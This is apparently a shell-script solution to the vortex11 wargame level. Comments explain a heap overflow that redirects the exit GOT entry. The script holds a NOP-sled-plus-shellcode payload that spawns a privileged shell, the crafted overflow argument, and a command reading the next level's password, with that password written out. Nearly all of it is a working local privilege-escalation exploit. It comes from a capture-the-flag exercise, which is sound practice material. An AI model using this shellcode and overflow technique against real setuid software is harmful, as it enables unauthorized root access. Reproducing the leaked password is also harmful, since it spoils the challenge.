#!/bin/sh
# Because of this part of source code: page_dir = (struct pginfo **) MMAP(malloc_pagesize);
# We know that p q r s are are lined up in memory
# So we can overflow r to overwrite the memory of s to EGG's memory address

# From source code: memset((u_char *)bp->page + k, SOME_JUNK, bp->size);
# We have to overwrite the page pointer to address of PTR_exit
# And then overwrite the exit GOT entry to address of shellcode which is EGG
# Address of PTR_exit: 0x0804d01c
# Assum k = 0x40, so we have to set the address (0x0804d01c - 0x40) = 0x804cfdc

mkdir /tmp/ballban_vortex11
cd /tmp/ballban_vortex11

export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 100 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")

# Create check_env.c and compile
nano check_env.c
gcc -m32 check_env.c -o check_env

# Check address of EGG and put EGG's address in EGG2
./check_env EGG # 0xffffdd77

/vortex/vortex11 $(python3 -c "import sys; import struct; sys.stdout.buffer.write(b'A' * 2048 + struct.pack('<I', 0x804cfdc) * 2 + b' ' + struct.pack('<I', 0xffffdd77))")

cat /etc/vortex_pass/vortex12
# Password: reDLd0Cai